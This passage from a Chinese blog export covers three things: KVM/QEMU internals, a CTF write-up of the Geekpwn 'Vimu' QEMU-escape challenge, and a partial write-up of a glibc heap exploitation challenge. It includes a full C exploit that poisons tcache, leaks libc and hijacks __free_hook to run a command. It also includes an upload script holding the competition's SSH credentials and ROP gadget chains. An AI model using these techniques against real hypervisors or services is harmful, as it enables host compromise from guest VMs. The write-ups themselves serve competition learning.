Virtualization Technology即Intel-VT技术。 Qemu-KvmQemu原本不是KVM的一部分，它自己就是一个纯软件实现的虚拟化系统，所以其性能低下。但是，QEMU代码中包含整套的虚拟机实现，包括处理器虚拟化，内存虚拟化，以及KVM需要使用到的虚拟设备模拟（网卡、显卡、存储控制器和硬盘等）。为了简化代码，KVM在 QEMU的基础上做了修改。VM运行期间，QEMU会通过KVM模块提供的系统调用进入内核，由KVM负责将虚拟机置于处理的特殊模式运行。当虚机进行I/O操作时，KVM会从上次系统调用出口处返回QEMU，由QEMU来负责解析和模拟这些设备。从QEMU角度看，也可以说是QEMU使用了KVM模块的虚拟化功能，为自己的虚机提供了硬件虚拟化加速。除此以外，虚机的配置和创建、虚机运行所依赖的虚拟设备、虚机运行时的用户环境和交互，以及一些虚机的特定技术比如动态迁移，都是QEMU自己实现的。 KVM内核模块在运行时按需加载进入内核空间运行。KVM本身不执行任何设备模拟，需要QEMU通过/dev/kvm接口设置一个GUEST OS的地址空间，向它提供模拟的I/O设备，并将它的视频显示映射回宿主机的显示屏。它是KVM虚机的核心部分，其主要功能是初始化CPU 硬件，打开虚拟化模式，然后将虚拟客户机运行在虚拟机模式下，并对虚机的运行提供一定的支持。以在Intel上运行为例，KVM模块被加载的时候，它： 首先初始化内部的数据结构； 做好准备后，KVM模块检测当前的CPU，然后打开CPU控制及存取CR4的虚拟化模式开关，并通过执行VMXON指令将宿主操作系统置于虚拟化模式的根模式； 最后，KVM模块创建特殊设备文件/dev/kvm并等待来自用户空间的指令。 接下来的虚机的创建和运行将是QEMU和KVM相互配合的过程。两者的通信接口主要是一系列针对特殊设备文件/dev/kvm的ioctl调用。其中最重要的是创建虚机。它可以理解成KVM为了某个特定的虚机创建对应的内核数据结构，同时，KVM返回一个文件句柄来代表所创建的虚机。 针对该句柄的调用可以对虚机做相应地管理，比如创建用户空间虚拟地址和客户机物理地址、真实物理地址之间的映射关系，再比如创建多个vCPU。KVM为每一个vCPU生成对应的文件句柄，对其相应地ioctl调用，就可以对vCPU进行管理。其中最重要的就是执行虚拟处理器。通过它，虚机在KVM的支持下，被置于虚拟化模式的非根模式下，开始执行二进制指令。在非根模式下，所有敏感的二进制指令都被CPU捕捉到，CPU在保存现场之后自动切换到根模式，由KVM决定如何处理。 除了CPU的虚拟化，内存虚拟化也由KVM实现。实际上，内存虚拟化往往是一个虚机实现中最复杂的部分。CPU中的内存管理单元MMU 是通过页表的形式将程序运行的虚拟地址转换成实际物理地址。在虚拟机模式下，MMU的页表则必须在一次查询的时候完成两次地址转换。因为除了将客户机程序的虚拟地址转换了客户机的物理地址外，还要将客户机物理地址转化成真实物理地址。]]></content>
      <categories>
        <category>Qemu&amp;KVM学习</category>
      </categories>
      <tags>
        <tag>summary</tag>
        <tag>Qemu</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2020Geekpwn_极限逃逸Vimu_解题过程分析]]></title>
    <url>%2F2020%2F07%2F23%2F2020Geekpwn_%E6%9E%81%E9%99%90%E9%80%83%E9%80%B8Vimu_%E8%A7%A3%E9%A2%98%E8%BF%87%E7%A8%8B%E5%88%86%E6%9E%90%2F</url>
    <content type="text"><![CDATA[Vimu前言​ 腾讯云鼎实验室主办的2020Geekpwn比赛在昨天晚上十点结束，我们队伍最终获得第五名的成绩，这个比赛难度相对比较大且压力主要在队伍的pwner身上，可以说是pwner的盛宴。 ​ 比赛设有四道G-escape题目，也就是四道逃逸类型的题目，childshell，Vimu，Easykernelvm，Kimu，最终解出数分别为6，2，1，0，我在比赛中有幸第一个解出了Vimu，肝了小一天半，最后能解出还是很开心的，在这里记录一下解题过程。这道题其实说难也有难度，做完再回头看的话，说简单也简单，这个每个人感觉可能都不同，此外我本人接触Qemu-Escape的时间也很短，如有错误或疏漏的地方还请大佬们在评论区指出。 解题过程环境配置题目给了Dockerfile，是18.04的标准版本，所以我还是用了我自己本地的docker，毕竟调试环境都配好了，比较方便，然后尝试运行，提示缺库，然后自行上网查找补齐即可，也没啥好说的，我大概补了七八个库才成功跑起来。。。 逆向查看题目的启动脚本，发现其启动了一个自定义设备vin，根据经验可知此应该为存在漏洞的自定义设备，把qemu-systen-x86_64放入ida中查看，发现被strip了，函数名和结构体都无了，所以必须把设备vin相关的函数给提取出来才能进一步分析，我这里是搜索特征字符串然后对比着edu.c源码提取出的函数： 此外我还自己照着标准的PCIDeviceClass建了一个结构体，方便看device_id和vender_id： 函数与漏洞分析vin_instance_init函数伪代码如下： 12345678910111213141516__int64 __fastcall vin_instance_init(__int64 a1)&#123; __int64 v1; // rax v1 = object_dynamic_cast_assert( a1, &amp;off_9FBFE6, "/home/v1nke/Desktop/qemu/pwn/qemu-4.0.0/hw/misc/vin.c", 307LL, "vin_instance_init"); *(_QWORD *)(v1 + 0x1AB0) = 0xFFFFFFFLL; *(_DWORD *)(v1 + 0x1AC0) = 1; *(_QWORD *)(v1 + 0x1AC8) = 0LL; *(_QWORD *)(v1 + 0x1AB8) = mmap64(0LL, (size_t)&amp;stru_10000, 3, 34, -1, 0LL); return object_property_add(a1, (__int64)"dma_mask");&#125; 可以看到实例化设备结构体时0x1AB0，0x1AB8，0x1AC0，0x1AC8四个位置的元素比较特殊，需要引起注意，其中0x1AB8处装有一个mmap64申请出来的0x10000字节大小的内存块起始地址，具有rw权限，且这个地址是随机的。 vin_mmio_read函数伪代码如下： 12345678910111213__int64 __fastcall vin_mmio_read(__int64 a1, int addr, unsigned int size)&#123; __int64 dest; // [rsp+28h] [rbp-18h] __int64 opaque; // [rsp+30h] [rbp-10h] unsigned __int64 v6; // [rsp+38h] [rbp-8h] v6 = __readfsqword(0x28u); opaque = a1; dest = 0LL; if ( BYTE2(addr) == 6 &amp;&amp; (unsigned __int16)addr &lt; (unsigned int)&amp;stru_10000 - size ) memcpy(&amp;dest, (const void *)((unsigned __int16)addr + *(_QWORD *)(opaque + 0x1AB8)), size); return dest;&#125; addr是用户传进来的参数，其最后两个字节被作为offset，倒数第三个字节被当做choice： vin_mmio_read时需要choic == 6且offset小于0x10000-size，size是根据你写的返回语句而定的，可以为1/2/4： 比如你写成返回一个uint64_t类型的数据： 1234uint64_t mmio_read(uint32_t addr)&#123; return *((uint64_t*)(mmio_mem + addr));&#125; 程序就会自动调用两次vin_mmio_read，每次size等于4。 你写成返回一个uint32_t类型的数据： 1234uint32_t mmio_read(uint32_t addr)&#123; return *((uint32_t*)(mmio_mem + addr));&#125; 程序就会调用一次vin_mmio_read，size等于4。 addr倒数第三个字节被当做choice： addr最后两个字节被当做offset： 这个函数实现的功能就是返回mmap64_start+offset处的数据给用户，也就是在mmap64内存块上可以任意地址读任意字节。 vin_mmio_write函数伪代码如下： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152void __fastcall vin_mmio_write(__int64 a1, __int64 a2, __int64 val, unsigned int size)&#123; char n[12]; // [rsp+4h] [rbp-3Ch] __int64 addr; // [rsp+10h] [rbp-30h] __int64 v6; // [rsp+18h] [rbp-28h] int v7; // [rsp+20h] [rbp-20h] int v8; // [rsp+24h] [rbp-1Ch] unsigned int v9; // [rsp+28h] [rbp-18h] unsigned int v10; // [rsp+2Ch] [rbp-14h] unsigned int v11; // [rsp+30h] [rbp-10h] unsigned int v12; // [rsp+34h] [rbp-Ch] __int64 opaque; // [rsp+38h] [rbp-8h] __int64 savedregs; // [rsp+40h] [rbp+0h] v6 = a1; addr = a2; *(_QWORD *)&amp;n[4] = val; opaque = a1; v7 = BYTE2(a2); switch ( (unsigned int)&amp;savedregs ) &#123; case 1u: v12 = (unsigned __int16)addr; if ( (unsigned __int16)addr &lt; (unsigned int)&amp;stru_10000 - size ) free((void *)(*(_QWORD *)(opaque + 0x1AB8) + v12)); break; case 3u: v11 = (unsigned __int16)addr; if ( (unsigned __int16)addr &lt; (unsigned int)&amp;stru_10000 - size ) memcpy((void *)(v11 + *(_QWORD *)(opaque + 0x1AB8)), &amp;n[4], size); break; case 4u: v10 = (unsigned __int16)addr; if ( *(_DWORD *)(opaque + 0x1AC0) == 1 ) &#123; *(_QWORD *)(opaque + 0x1AC8) = malloc(8LL * v10); --*(_DWORD *)(opaque + 0x1AC0); &#125; break; case 7u: v9 = (unsigned __int16)addr; if ( (unsigned __int16)addr &lt;= 0x2Fu ) memcpy((void *)(v9 + *(_QWORD *)(opaque + 0x1AC8)), &amp;n[4], size); break; case 8u: v8 = (unsigned __int16)addr; malloc(8LL * (unsigned __int16)addr); break; default: return; &#125;&#125; addr和size的用法同上，但是这里需要注意的是每个case所适配的size可能不同，比如你想调用case 8时，size就必须为1，你要是为4，他就会自动调用4次，且addr每次递增1，想调用case 1时，size必须为4，你要是为8，他就会自动调用两次，每次addr递增4，这点我当时做的时候被坑惨了。。。 这个函数可以看到一共有5个case，case 1是一个任意free(mmap64_start+offset)的功能，这也是漏洞点所在，case 3是一个对mmap64_start+offset任意写的功能，case 4是用malloc申请一个任意size的chunk并保存在0x1AC8位置处，有且只有一次机会，case 7是对0x1AC8处指针指向的地址任意写的功能，且不限次数，初始的0x1AC8处存的值是0，case 8是一个不限次数，不限大小的malloc功能。 利用看下checksec，发现保护全开，所以利用应该是需要劫持hook或者rop： leak如何leak出libc成为了这题的难点，需要注意leak不能使用那一次case 4，正常情况下那是留给hijack时任意地址分配+写时用的（当然也有可能先利用这次机会控制设备结构体，然后再突破次数限制）。 思路一最先想到的肯定是把fake_chunk放进unsortedbin里，然后用UAF把libc泄露出来。 尝试发现不可行，导致不可行的因素有二： qemu自带的多线程情景。 绕不过nextchunk &lt; topchunk+size(topchunk)的检测。 在调用vin_mmio_read/write处理设备的时候断下来，我们可以发现程序开启了四个thread，而我们处理设备时必定处于第三个thread。 由于tcache指针在MAYBE_INIT_TCACHE函数中被初始化，其会自动找到可用arena的tcache，当前thread的arena若可用肯定就初始化为本线程的arena的tcache，所以我们free的fake_chunk必定会先放到当前thread对应size的tcache中，若已经满了，才会再根据size是否小于global_max_fast判断，是则放入arena_ptr的fastbin中，（否的话就会报错，是没法放入unsortedbin的，这点之后会细说），这个arena_ptr是根据进入_int_free前的arena_for_chunk获取来的，其是根据chunk的N标志位判定的，为1代表属于thread_arena，为0代表属于main_arena。 N为0时，是可以将fake_chunk放入main_arena的fastbin中的，但是当我伪造N为1时，想将chunk放入thread的fastbin时，发现必定会报错，跟进arena_for_chunk，发现程序看到N为1时，会判定这个chunk是属于一个thread_arena的，然后其会去寻找这个thread的malloc_state，也就是arena_ptr，然后这个寻找的方法竟然是直接将chunk_addr &amp; 0xfffffffffc000000作为thread的一个heap_info，然后从[chunk_addr &amp; 0xfffffffffc000000]里取出值作为malloc_state的地址（因为正常thread的所有heap_info的第一个数据位装的都是malloc_state地址）。但是我们的fake_chunk与0xfffffffffc000000按位与后地址肯定是个不合法地址，所以之后必定会有访存错误。 所以我们没办法把chunk放入thread_arena的fastbin中，只能放进thread_arena的tcache中或者main_arena的fastbin中。 但是为什么没办法放入main_arena的unsortedbin中呢？对照着free的报错信息double free or corruption (out)找到对应的检测：发现在将chunk放入fastbin和unsortedbin之间会有一系列的轻量级检测，其中有一个是检测nextchunk &gt;= av-&gt;topchunk + chunksize(av-&gt;top)，我们的fakechunk是在mmap64地址上的，这个地址虽然是随机的，但是必定在ld.so的加载位置之后，所以其地址必定是大于main_arena的topchunk+size(topchunk)的地址的，所以如果放不进fastbin，走到这里必定会挂掉，这就是没法放进unsortedbin的原因所在。 所以想直接把chunk放入unsortedbin的尝试失败了。 思路二直接放不行，那么尝试间接放入，先放入main_arena的fastbin中，然后想办法触发main_arena的malloc_consolidate，使其将fastbin中的chunk整理进smallbin中再进行leak出来。 查阅资料得知，在__libc_malloc的arena_get函数理论上是可能返回main_arena指针的，但是我写了个for循环，连续1000次malloc(0x500)，尝试了很久，都没办法触发到。。。可能原因是当前线程的arena是处于可用状态的，所以就直接返回当前线程的arena了，只有在本线程被lock了，才有可能返回其他的arena？？具体原因我也不是很清楚，写多线程竞争malloc是否可行？？感觉不是很靠谱。。我自己是失败了。 想把fakechunk间接放入unsortedbin也失败了。 思路三既然泄露libc失败了，那就看看没有libc能不能利用呢，观察发现有一块rwx的区域，且和我们的thread_heap的距离有可能间隔固定为0x6000000，（这张图我截的是关了alsr的，是固定为0x6000000，开了以后会变，但仍然有概率是0x6000000，大概五六次可以撞见一次？反正是有的）。 首先是如何泄露thread_heap基址，因为程序比较复杂和多线程的原因，堆极度混乱，我顺手截了几张图： 几乎每次的各种链里的chunk都不同，所以没办法用UAF泄露出一个稳定的chunk地址，但是因为有前面free里面寻找malloc_state方法的提示，可以想到我们只需要malloc_state的地址，不需要关注具体某一个chunk的地址，所以泄露出任意一个chunk地址，然后与0xffffff000000按位与即可获得当前线程malloc_state的起始地址。 然后我们加上0x6000000就有概率获取rwx页的地址，然后用一次任意地址分配+写的机会去往里面填充shellcode，但是后续我想不到如何将程序劫持到shellcode上去。。。 注：此块rwx页的申请并非故意留的后门，为tcg/translate-all.c设备申请出来作为dynamic translator buffer用的： 思路四说是只有一次机会任意地址分配+写，但实际上是只有一次任意地址分配的机会，然后有无限次向其中写的机会，所以可以想到能否先用这一次任意地址分配去分配到设备结构体，然后不断用写去将0x1AC0赋值为1，进而突破限制造成无限次任意地址分配，然后配合思路三去做。 要是设备结构体是分配在线程堆上的话，此方法应该是可行的，然而调试发现其位于main_arena上，啊这。 突破到这里已经过去一天的时间了。。。第二天起来还是没有啥思路，整理了一下思绪和现在可以做到的事情： 我们只能泄露出mmap64的地址和thread_arena的地址。 因为只有thread_arena的地址是现阶段可以得到的，所以我抱着试一试的态度去看了下thread_arena中的数据，没想到有意外收获： 在thread_heap固定偏移的地方存有稳定的elfbase地址，而且有很多个。。。说实话我不知道这些数据是做什么的，但是线程的malloc_state和heap_info中是不存在这种数据的： malloc_state： 123456789101112131415161718192021222324252627282930313233struct malloc_state&#123; /* Serialize access. */ mutex_t mutex; /* Flags (formerly in max_fast). */ int flags; /* Fastbins */ mfastbinptr fastbinsY[NFASTBINS]; /* Base of the topmost chunk -- not otherwise kept in a bin */ mchunkptr top; /* The remainder from the most recent split of a small request */ mchunkptr last_remainder; /* Normal bins packed as described above */ mchunkptr bins[NBINS * 2 - 2]; /* Bitmap of bins */ unsigned int binmap[BINMAPSIZE]; /* Linked list */ struct malloc_state *next; /* Linked list for free arenas. */ struct malloc_state *next_free; /* Memory allocated from the system in this arena. */ INTERNAL_SIZE_T system_mem; INTERNAL_SIZE_T max_system_mem;&#125;; heap_info： 123456789101112typedef struct _heap_info&#123; mstate ar_ptr; /* Arena for this heap. */ struct _heap_info *prev; /* Previous heap. */ size_t size; /* Current size in bytes. */ size_t mprotect_size; /* Size in bytes that has been mprotected PROT_READ|PROT_WRITE. */ /* Make sure the following data is properly aligned, particularly that sizeof (heap_info) + 2 * SIZE_SZ is a multiple of MALLOC_ALIGNMENT. */ char pad[-6 * SIZE_SZ &amp; MALLOC_ALIGN_MASK];&#125; heap_info; 查看malloc_state结构体中内容： 发现从偏移0x8c0处malloc_state就已经结束，，接着是一个0x255的chunk，其是负责管理tcache的结构体： 然后到偏移0xB10处，tcache管理结构体结束，又是一个0x98c5的超大chunk，而那些elfbase就是存在于这个chunk中，但是我不知道他是用来做什么的以及那些elf的地址的意义代表什么： 发现了存在elfbase之后，就可以想办法将其泄露出来。 我们可以先确定一个程序使用率较低的size的tcache链来进行后续攻击，我这里选的是0x400这条链。先泄露出thread_heap的基址，然后free一个size为0x400的fake_chunk进入对应的tcache，然后用case 2去将这个fake_chunk的fd改为带有elfbase地址的thread_heap地址，我选的偏移是0xBA0。 形成如下结构： 1(0x400) tcache_entry[62](2): fake_chunk --&gt; thread_heap_start + 0xba0 --&gt; elfbase + offset --&gt; xxxxxxxx 然后调用两次case 8，一次case 1： 1(0x400) tcache_entry[62](1): fake_chunk --&gt; elfbase + offset --&gt; xxxxxxxx 但是要注意一点，我们需要在进行leak elfbase之前要先布置好tcache-&gt;counts[62]，因为我们malloc的次数比free的次数要多，所以假如开始时count为1的话，那么在两次malloc之后会变为255，也就是-1，这时在那一次case 1的free中程序检测tcache已满，所以会去尝试放入unsortedbin中，导致报错，所以在最开始要先free两次fake_chunk将tcache-&gt;counts[62]调整为2。 然后用mmap64的任意读读出elfbase地址。 有了elfbase之后，我们就可以用GOT表泄露libcbase，方法同上，注意点同上，要先将tcache-&gt;counts[62]调整为2。 hijack有了libcbase之后，用一次任意地址分配+写去改free_hook为system，然后在mmap64处布置好cat /flag字符串，调用case 1触发free(&quot;cat /flag&quot;)即可。 exp加getchar是为了在调试时使gdb的信号接收不错位，比如你exp里先调用了mmio_write，后调用了mmio_read，然后在mmio_read和mmio_write的地址都下了断点，按c，会发现有时是先断在mmio_read的，可能是读的信号来的更快？？总之加了getchar就不会错位，sleep(0.1)应该也可以起到相同效果。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130#define _GNU_SOURCE#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;stdint.h&gt;#include &lt;stdlib.h&gt;#include &lt;fcntl.h&gt;#include &lt;assert.h&gt;#include &lt;inttypes.h&gt;#include &lt;sys/mman.h&gt;#include &lt;errno.h&gt;#include &lt;unistd.h&gt;#include &lt;sys/io.h&gt;unsigned char* mmio_mem;void perr(char buf[])&#123; puts(buf); exit(1);&#125;void mmio_write(uint64_t addr, uint64_t value)&#123; *((uint32_t*)(mmio_mem + addr)) = value;&#125;uint64_t mmio_read(uint32_t addr)&#123; return *((uint64_t*)(mmio_mem + addr));&#125;int main()&#123; setbuf(stdout,0); int mmio_fd = open("/sys/devices/pci0000:00/0000:00:04.0/resource0",O_RDWR|O_SYNC); if (mmio_fd == -1) perr("[:(]mmio_fd open failed..."); mmio_mem = mmap(0,0x100000,PROT_READ|PROT_WRITE,MAP_SHARED,mmio_fd,0); if (mmio_mem == MAP_FAILED) perr("[:(]mmap mmio_mem failed..."); printf("[:)]mmio_mem = %p\n", mmio_mem); mmio_write(0x030008,0x400); getchar(); mmio_write(0x010010,0); getchar(); mmio_write(0x010010,0); getchar(); mmio_write(0x010010,0); getchar(); mmio_write(0x030408,0x290); getchar(); mmio_write(0x010410,0); getchar(); uint64_t thread_heap = mmio_read(0x060410); thread_heap &amp;= 0xffffff000000; printf("[:)]thread_heap = %p\n",thread_heap); getchar(); mmio_write(0x030010,thread_heap + 0xba0); getchar(); mmio_write(0x030014,thread_heap &gt;&gt; 32); getchar(); *((uint8_t*)(mmio_mem + 0x08007E)) = 0; getchar(); *((uint8_t*)(mmio_mem + 0x08007E)) = 0; getchar(); mmio_write(0x010010,0); getchar(); uint64_t codebase = mmio_read(0x060010)-(0x5555567ae468-0x555555554000); printf("[:)]codebase = %p\n",codebase); uint64_t free_got = 0x1092330 + codebase; getchar(); mmio_write(0x010010,0); getchar(); mmio_write(0x030010,free_got); getchar(); mmio_write(0x030014,free_got &gt;&gt; 32); getchar(); *((uint8_t*)(mmio_mem + 0x08007E)) = 0; getchar(); *((uint8_t*)(mmio_mem + 0x08007E)) = 0; getchar(); mmio_write(0x010010,0); getchar(); uint64_t libcbase = mmio_read(0x060010)-0x97950; printf("[:)]libcbase = %p\n",libcbase); uint64_t free_hook = libcbase + (0x7ffff41528e8-0x00007ffff3d65000); uint64_t system_addr = libcbase + (0x7ffff3db4440-0x00007ffff3d65000); getchar(); mmio_write(0x030010,free_hook); getchar(); mmio_write(0x030014,free_hook &gt;&gt; 32); getchar(); *((uint8_t*)(mmio_mem + 0x08007E)) = 0; getchar(); *((uint8_t*)(mmio_mem + 0x04007E)) = 0; getchar(); *((uint64_t*)(mmio_mem + 0x070000)) = system_addr; getchar(); mmio_write(0x030010,0x20746163); getchar(); mmio_write(0x030014,0x616c662f); getchar(); mmio_write(0x030018,0x067); getchar(); mmio_write(0x010010,0); exit(0);&#125;/*0x00007ffff3d65000 0x00007ffff3f4c000 r-xp /lib/x86_64-linux-gnu/libc-2.27.so0x00007ffff3f4c000 0x00007ffff414c000 ---p /lib/x86_64-linux-gnu/libc-2.27.so0x00007ffff414c000 0x00007ffff4150000 r--p /lib/x86_64-linux-gnu/libc-2.27.so0x00007ffff4150000 0x00007ffff4152000 rw-p /lib/x86_64-linux-gnu/libc-2.27.sogdb-peda$ p &amp;__free_hook$1 = (void (**)(void *, const void *)) 0x7ffff41528e8 &lt;__free_hook&gt;gdb-peda$ p &amp;system $2 = (int (*)(const char *)) 0x7ffff3db4440 &lt;__libc_system&gt;*/ upload打远程需要上传写好的exp，一般流程是先用musl-gcc编译，然后strip，然后再传： 123musl-gcc myexp.c -Os -o myexpstrip myexppython upload.py upload.py： 1234567891011121314151617181920212223242526272829303132333435363738394041424344#coding:utf-8from pwn import *import commandsHOST = "110.80.136.39"PORT = 22USER = "pwnvimu"PW = "pwnvimu2002"#context.log_level = 'debug'def exec_cmd(cmd): r.sendline(cmd) r.recvuntil("/ # ") def upload(): p = log.progress("Upload") with open("myexp","rb") as f: data = f.read() encoded = base64.b64encode(data) r.recvuntil("/ # ") for i in range(0,len(encoded),1000): p.status("%d / %d" % (i,len(encoded))) exec_cmd("echo \"%s\" &gt;&gt; benc" % (encoded[i:i+1000])) exec_cmd("cat ./benc | base64 -d &gt; ./bout") exec_cmd("chmod +x ./bout") log.success("success")def exploit(r): upload() r.interactive()local = 0if __name__ == "__main__": if local != 1: session = ssh(USER, HOST, PORT, PW) r = session.run("/bin/sh") exploit(r) 结语做完以后回头看，是不是你也觉得这道题没有这么难，只是细节比较多。 目前我个人遇到的qemu设备方面的逃逸大体分为两种，一种是写了个自定义设备，然后存在漏洞，另一种是更改了其原有的设备，需要我们对比源码与寻找漏洞，且一般来说第二种难度会更大一点（当然并不意味着第一种就会很简单），Kimu貌似是属于第二种？ 这是我第一次在比赛中做出qemu-escape，比较开心，但是路还很长，需倍加努力。]]></content>
      <categories>
        <category>CTF-PWN</category>
      </categories>
      <tags>
        <tag>Qemu逃逸</tag>
        <tag>RealWorld</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2020TCTF/2020Geekpwn部分题解]]></title>
    <url>%2F2020%2F07%2F20%2F2020TCTF2020Geekpwn%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3%2F</url>
    <content type="text"><![CDATA[duethttps://www.anquanke.com/post/id/210160#h2-4 emmmm_writeup r3kapig_writeup 有且只有一次off-by-one的机会，只有ptr_list只有两个位置，且无法在没有delete的情况下new，只有calloc，且size范围在0x80~0x400之间，libc为2.29，只能orw。 解法一思路这道题的堆风水复杂程度在我做过的glibc题里绝对可以排进前五了，所以还是稍微把过程写的细一点。 先选定一个用来smallbin_attack的target_size，越小越好，我这里用的是0xa0，因为最小的0x90被程序自身用了。(为什么说越小越好呢，因为我们需要构造的情景是在对应size的tcache未满的情况下将chunk放入smallbin，所以不能直接free，直接free会被放入tcache中，只能用切割剩余的方法来间接放入，比如先申请一个大的size1，然后释放他进入ub，然后在申请一个小的size2，所以ub里剩下的被切割的size1-size2为我们提前设定好用来smallbin_attack的target_size，然后再申请一个比target_size大的chunk，这时target_size的chunk就会被放入smallbin，因为最后必须申请一个比target_size大的chunk，所以target_size与越小，我们可操纵的size范围就越大。)，然后用普通的堆风水将一个0xa0的chunk放进smallbin中。 之后用堆风水配合off-by-one，构造出chunk overlapping，这里为了表述简单，把overlapping自己的next_chunk的chunk称作主chunk，被自己prev_chunk给overlapping的chunk称作从chunk。用主chunk去改从chunk的size，然后在从chunk里的中间部位切割出一个0xa0的chunk，然后free掉主chunk，再申请一个0x300的chunk将0xa0的chunk挤入smallbin，且其fd和bk正好存有heap和libc的地址，所以我们可以用show从chunk来得到heapbase和libcbase，然后free我们的从chunk(size已被改写且其对应的tcache在开始已布置慢)再calloc回来，改写位于其中间的smallbin中的倒数第二个chunk的fd和bk，进行smallbin_attack攻击global_max_fast。 这时候我们的从chunk成为了新的主chunk，那个0xa0的chunk成为了新的从chunk，对主chunk进行一系列的free+calloc去改写从chunk的size和fd，达到向main_arena中写入一个fake_size的效果，然后将从chunk的size改为fake_size，并将其free掉，然后再改其fd，再calloc出来，再将主chunk给舍弃掉(因为他的任务已经完成了，现在这个位置要拿去做更重要的事情)，再calloc一个fake_size的chunk，这时就会分配到main_arena上，我们得以控制main_arena，进一步控制topchunk去劫持__free_hook，注意calloc里在没进入_int_malloc之前会有一步将topchunk的size取出来，但是貌似没进一步检测，所以topchunk的位置必须放一个可读的地址，可先写为目标地址__free_hook-0xb58，这时__free_hook-0xb58处的值还不合法，绕不过后续检测，我们后续需要改其为0x21001。 然后观察在__free_hook-0xb68-1的位置有一个0x100可作为fake_size，将其写入对应size的fastbin中，且因为我们需要将用来控制main_arena的chunk给成功free(因为一个位置是肯定不够用的)，所以需要在其后布置一个next_chunk的fake_size，这一点在控制main_arena的情形下配合另一个位置很容易实现。 然后calloc一个0xf0的chunk，成功改__free_hook-0xb58处值为0x21001，然后free掉控制main_arena的chunk，不断calloc，知道申请到__free_hook。（需要提前在main_arena布置好数据，绕过*(main_arena+0x78) == main_arena+0x60的检测） 至于劫持控制流： 用__IO_wfile_sync函数中的gadget配合setcontext： 123456789101112131415161718192021222324252627282930313233343536370x7ffff7e59462 &lt;__GI__IO_wfile_sync+2&gt;: push rbp0x7ffff7e59463 &lt;__GI__IO_wfile_sync+3&gt;: push rbx0x7ffff7e59464 &lt;__GI__IO_wfile_sync+4&gt;: mov rbx,rdi0x7ffff7e59467 &lt;__GI__IO_wfile_sync+7&gt;: sub rsp,0x100x7ffff7e5946b &lt;__GI__IO_wfile_sync+11&gt;: mov rax,QWORD PTR [rdi+0xa0]0x7ffff7e59472 &lt;__GI__IO_wfile_sync+18&gt;: mov rdx,QWORD PTR [rax+0x20]0x7ffff7e59476 &lt;__GI__IO_wfile_sync+22&gt;: mov rsi,QWORD PTR [rax+0x18]0x7ffff7e5947a &lt;__GI__IO_wfile_sync+26&gt;: cmp rdx,rsi0x7ffff7e5947d &lt;__GI__IO_wfile_sync+29&gt;: jbe 0x7ffff7e594ad &lt;__GI__IO_wfile_sync+77&gt;0x7ffff7e594ad &lt;__GI__IO_wfile_sync+77&gt;: mov rsi,QWORD PTR [rax]0x7ffff7e594b0 &lt;__GI__IO_wfile_sync+80&gt;: mov rax,QWORD PTR [rax+0x8]0x7ffff7e594b4 &lt;__GI__IO_wfile_sync+84&gt;: cmp rsi,rax0x7ffff7e594b7 &lt;__GI__IO_wfile_sync+87&gt;: je 0x7ffff7e59532 &lt;__GI__IO_wfile_sync+210&gt;0x7ffff7e594b9 &lt;__GI__IO_wfile_sync+89&gt;: sub rsi,rax0x7ffff7e594bc &lt;__GI__IO_wfile_sync+92&gt;: mov r12,QWORD PTR [rbx+0x98]0x7ffff7e594c3 &lt;__GI__IO_wfile_sync+99&gt;: sar rsi,0x20x7ffff7e594c7 &lt;__GI__IO_wfile_sync+103&gt;: mov rbp,rsi0x7ffff7e594ca &lt;__GI__IO_wfile_sync+106&gt;: mov rdi,r120x7ffff7e594cd &lt;__GI__IO_wfile_sync+109&gt;: call QWORD PTR [r12+0x20]0x7ffff7e25e35 &lt;setcontext+53&gt;: mov rsp,QWORD PTR [rdx+0xa0]0x7ffff7e25e43 &lt;setcontext+67&gt;: mov rbp,QWORD PTR [rdx+0x78]0x7ffff7e25e47 &lt;setcontext+71&gt;: mov r12,QWORD PTR [rdx+0x48]0x7ffff7e25e4b &lt;setcontext+75&gt;: mov r13,QWORD PTR [rdx+0x50]0x7ffff7e25e4f &lt;setcontext+79&gt;: mov r14,QWORD PTR [rdx+0x58]0x7ffff7e25e53 &lt;setcontext+83&gt;: mov r15,QWORD PTR [rdx+0x60]0x7ffff7e25e57 &lt;setcontext+87&gt;: mov rcx,QWORD PTR [rdx+0xa8]0x7ffff7e25e5e &lt;setcontext+94&gt;: push rcx0x7ffff7e25e5f &lt;setcontext+95&gt;: mov rsi,QWORD PTR [rdx+0x70]0x7ffff7e25e63 &lt;setcontext+99&gt;: mov rdi,QWORD PTR [rdx+0x68]0x7ffff7e25e67 &lt;setcontext+103&gt;: mov rcx,QWORD PTR [rdx+0x98]0x7ffff7e25e6e &lt;setcontext+110&gt;: mov r8,QWORD PTR [rdx+0x28]0x7ffff7e25e72 &lt;setcontext+114&gt;: mov r9,QWORD PTR [rdx+0x30]0x7ffff7e25e76 &lt;setcontext+118&gt;: mov rdx,QWORD PTR [rdx+0x88]0x7ffff7e25e7d &lt;setcontext+125&gt;: xor eax,eax0x7ffff7e25e7f &lt;setcontext+127&gt;: ret 至于找的方法么，有两种： 12ropper --file /path/to/file --nocolor &gt; ./gadget_roppercat ./gadget_ropper | grep 'rdx' | grep ', qword ptr \[rdi' &gt; gadget 然后打开文本编辑器ctrl+F搜索rdx, qword ptr [rdi，看有无合适的gadget，这种运气好是可以找到的，但是找不到带有条件跳转语句的复杂gadget，找不到的话再逐个看吧。 这里比较幸运是有两个合适的gadget的： 12340x7ffff7efbe97 &lt;__libc_cleanup_routine+7&gt;: mov rdx,QWORD PTR [rdi+0x8]0x7ffff7efbe9b &lt;__libc_cleanup_routine+11&gt;: mov rax,QWORD PTR [rdi]0x7ffff7efbe9e &lt;__libc_cleanup_routine+14&gt;: mov rdi,rdx0x7ffff7efbea1 &lt;__libc_cleanup_routine+17&gt;: jmp rax 1230x7ffff7f20550 &lt;getkeyserv_handle+576&gt;: mov rdx,QWORD PTR [rdi+0x8]0x7ffff7f20554 &lt;getkeyserv_handle+580&gt;: mov QWORD PTR [rsp],rax0x7ffff7f20558 &lt;getkeyserv_handle+584&gt;: call QWORD PTR [rdx+0x20] 先objdump -d user_file -M intel &gt; gadget，然后打开文本编辑器ctrl+F搜索,QWORD 